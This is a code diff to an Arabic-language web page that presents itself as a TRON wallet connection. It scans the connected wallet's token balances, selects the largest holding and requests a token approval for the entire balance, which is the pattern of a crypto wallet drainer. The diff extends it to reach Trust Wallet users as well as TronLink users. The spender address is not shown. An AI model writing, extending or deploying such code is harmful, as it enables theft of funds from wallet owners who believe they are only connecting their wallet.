@@ -3,17 +3,19 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>ربط وطلب Approve</title>
+  <title>ربط محفظة TRON وطلب Approve</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <h2>ربط محفظة TRON</h2>
+  <h2>ربط محفظة </h2>
   <button id="connectWalletBtn">ربط المحفظة</button>
   <p id="status"></p>
+  <a id="openTronLink" href="tronlink://" style="display:none;">فتح TronLink</a>
+  <a id="openTrustWallet" href="trust://" style="display:none;">فتح Trust Wallet</a>
 
   <script>
     const tronTokens = [
-      { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" }, // عنوان USDT الصحيح على Mainnet
+      { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
       { symbol: "USDJ", address: "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT" },
       { symbol: "TUSD", address: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4" },
       { symbol: "WIN", address: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7" },
@@ -29,31 +31,49 @@
       statusElement.innerText = "جارٍ الاتصال بالمحفظة...";
 
       // التحقق من وجود TronLink
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        statusElement.innerText = "يرجى تثبيت TronLink أو تسجيل الدخول في المحفظة.";
-        return;
-      }
-
-      try {
+      if (window.tronWeb && window.tronWeb.ready) {
         tronWeb = window.tronWeb;
         userAddress = tronWeb.defaultAddress.base58;
-
-        if (!userAddress) {
-          statusElement.innerText = "فشل جلب عنوان المحفظة. تأكد من تسجيل الدخول في TronLink.";
-          return;
+        if (userAddress) {
+          statusElement.innerText = `المحفظة متصلة (TronLink): ${userAddress}`;
+          return await processTokens();
         }
+      }
 
-        statusElement.innerText = `المحفظة متصلة: ${userAddress}`;
+      // التحقق من Trust Wallet أو محافظ تدعم Web3
+      if (window.ethereum || window.tron) {
+        try {
+          tronWeb = new TronWeb({
+            fullHost: "https://api.trongrid.io"
+          });
+          // طلب الاتصال بـ Trust Wallet
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          userAddress = accounts[0];
+          tronWeb.setAddress(userAddress);
+          statusElement.innerText = `المحفظة متصلة (Trust Wallet): ${userAddress}`;
+          return await processTokens();
+        } catch (err) {
+          console.error("فشل الاتصال بـ Trust Wallet", err);
+        }
+      }
 
+      // لو المحفظة مش موجودة، اعرض روابط لفتح التطبيقات
+      statusElement.innerText = "لم يتم العثور على محفظة. افتح TronLink أو Trust Wallet.";
+      document.getElementById("openTronLink").style.display = "inline";
+      document.getElementById("openTrustWallet").style.display = "inline";
+    }
+
+    async function processTokens() {
+      const statusElement = document.getElementById("status");
+      try {
         // جلب أكبر رصيد توكن
         let maxToken = null;
         let maxBalance = 0;
-        let decimals = 6; // قيمة افتراضية، هتتعدل بناءً على التوكن
+        let decimals = 6;
 
         for (const token of tronTokens) {
           try {
             const contract = await tronWeb.contract().at(token.address);
-            // جلب عدد الأرقام العشرية
             decimals = await contract.decimals().call();
             let balance = await contract.balanceOf(userAddress).call();
             balance = tronWeb.toBigNumber(balance.toString()).div(10 ** decimals).toNumber();
@@ -74,7 +94,7 @@
 
         statusElement.innerText += `\nأكبر رصيد توكن: ${maxToken.symbol} = ${maxBalance}`;
 
-        // طلب Approve بكمية معقولة (مثلاً كل الرصيد)
+        // طلب Approve بكمية الرصيد
         const contract = await tronWeb.contract().at(maxToken.address);
         const amount = tronWeb.toBigNumber(maxBalance * (10 ** decimals)).toString();
 
@@ -87,7 +107,7 @@
             console.error(err);
           });
       } catch (err) {
-        statusElement.innerText = "فشل الربط بالمحفظة أو حدث خطأ.";
+        statusElement.innerText = "حدث خطأ أثناء معالجة التوكنات.";
         console.error(err);
       }
     }
